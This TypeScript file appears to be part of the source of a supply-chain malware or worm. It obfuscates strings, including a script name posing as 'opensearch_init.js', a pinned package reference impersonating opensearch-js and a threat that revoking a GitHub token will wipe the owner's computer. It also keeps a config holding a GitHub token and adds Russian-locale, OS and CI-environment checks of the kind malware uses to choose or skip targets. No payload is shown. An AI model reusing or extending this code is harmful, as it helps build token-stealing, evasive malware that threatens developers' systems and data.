export const SCRIPT_NAME = scramble("opensearch_init.js");
export const SEARCH_STRING = scramble(
  "IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner",
);

export const PACKAGE_NAME = scramble(
  "github:opensearch-project/opensearch-js#d446803f4c3bc116263faa3499a1d3f95b2825de",
);

export interface Config {
  githubToken: string;
  pollIntervalMs: number;
}

declare function scramble(str: string): string;
export function isSystemRussian(): boolean {
  try {
    const locale = (
      Intl.DateTimeFormat().resolvedOptions().locale || ""
    ).toLowerCase();
    if (locale.startsWith(scramble("ru"))) return true;
  } catch {}

  const env = (
    process.env.LC_ALL ||
    process.env.LC_MESSAGES ||
    process.env.LANGUAGE ||
    process.env.LANG ||
    ""
  ).toLowerCase();
  if (env.startsWith("ru")) return true;

  const winLike = (
    process.env.SystemRoot
      ? process.env.LANG || process.env.LANGUAGE || process.env.LC_ALL || ""
      : ""
  ).toLowerCase();
  if (winLike.startsWith(scramble("ru"))) return true;

  return false;
}

export type OS = "OSX" | "WIN" | "LINUX" | "UNKNOWN";

export function detectOS(platform: string = process.platform): OS {
  const p = platform.toLowerCase();
  if (p === "darwin") return "OSX";
  if (p === "win32" || p === "cygwin" || p === "msys") return "WIN";
  if (p === "linux") return "LINUX";
  return "UNKNOWN";
}

export function isCI(): boolean {
  // Common CI environment variable (set by many CI systems)
  if (process.env.CI === "true" || process.env.CI === "1") return true;

  // GitHub Actions
  if (process.env.GITHUB_ACTIONS) return true;

  // GitLab CI
  if (process.env.GITLAB_CI) return true;

  // Travis CI
  if (process.env.TRAVIS) return true;

  // CircleCI
  if (process.env.CIRCLECI) return true;

  // Jenkins
  if (process.env.JENKINS_URL) return true;

  // Azure Pipelines
  if (process.env.BUILD_BUILDURI) return true;

  // AWS CodeBuild
  if (process.env.CODEBUILD_BUILD_ID) return true;

  // Buildkite
  if (process.env.BUILDKITE) return true;

  // AppVeyor
  if (process.env.APPVEYOR) return true;

  // Bitbucket Pipelines
  if (process.env.BITBUCKET_BUILD_NUMBER) return true;

  // Drone
  if (process.env.DRONE) return true;

  // Semaphore
  if (process.env.SEMAPHORE) return true;

  // TeamCity
  if (process.env.TEAMCITY_VERSION) return true;

  // Bamboo
  if (process.env.bamboo_agentId) return true;

  // Bitrise
  if (process.env.BITRISE_IO) return true;

  // Cirrus CI
  if (process.env.CIRRUS_CI) return true;

  // Codefresh
  if (process.env.CF_BUILD_ID) return true;

  // Codeship
  if (process.env.CI_NAME === "codeship") return true;

  // Netlify
  if (process.env.NETLIFY === "true") return true;

  // Vercel
  if (process.env.VERCEL || process.env.NOW_GITHUB_DEPLOYMENT) return true;

  // Wercker
  if (process.env.WERCKER_MAIN_PIPELINE_STARTED) return true;

  // Buddy
  if (process.env.BUDDY_WORKSPACE_ID) return true;

  // Shippable
  if (process.env.SHIPPABLE) return true;

  // Woodpecker CI
  if (process.env.CI === "woodpecker") return true;

  // JetBrains Space
  if (process.env.JB_SPACE_EXECUTION_NUMBER) return true;

  // Sail CI
  if (process.env.SAILCI) return true;

  // Vela
  if (process.env.VELA) return true;

  // Screwdriver.cd
  if (process.env.SCREWDRIVER) return true;

  // Cloudflare Pages
  if (process.env.CF_PAGES === "1") return true;

  // Puppet
  if (process.env.DISTELLI_APPNAME) return true;

  return false;
}
